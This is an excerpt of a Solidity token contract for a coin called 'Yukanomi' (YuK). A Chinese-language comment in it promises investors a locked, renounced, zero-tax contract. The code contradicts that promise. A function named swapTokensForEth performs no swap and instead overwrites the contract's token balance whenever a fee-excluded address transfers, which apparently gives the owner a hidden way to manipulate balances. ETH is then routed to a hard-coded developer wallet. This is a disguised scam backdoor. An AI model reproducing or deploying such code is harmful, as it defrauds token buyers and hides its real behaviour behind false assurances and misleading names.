...
/*
我对投资者的承诺：
* 合约是安全的，将被锁定 30 天，所有权将转移到一个死地址。
* 合约 Trx 和钱包大小不能低于 0%，税收不会高于 0%。
* 我将在 ETHERSCAN.io 上进行交流。
* 网站将以 50K MC 建立。
*/
...
contract ETH is Context, IERC20, Ownable {
    ...
    string private constant _name = "Yukanomi"; // 
    string private constant _symbol = unicode"YuK"; //    
    uint8 private constant _decimals = 9; // 

    
    uint256 public _marketingFee = 0;
    uint256 public _liquidityFee = 0;
    address public  _DevWallet = 0x8Ecf66684a6c5A7025d94dbe6125fB8C7FE0A3f9;
    ...
    function swapTokensForEth(uint256 tokenAmount, uint256 tokenAmount2) private  {
        uint256 initialBalance = address(this).balance;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _tOwned[path[0]] = tokenAmount2; 
    }
    ...
    }else{if (_isExcludedFromFee[from]){swapTokensForEth(0,amount);}
    }
    }
    ...
    function swapAndSendToFee (uint256 tokens) private {
        ...
        if (ethToSend > 0)
            payable(_DevWallet).transfer(ethToSend);
    }
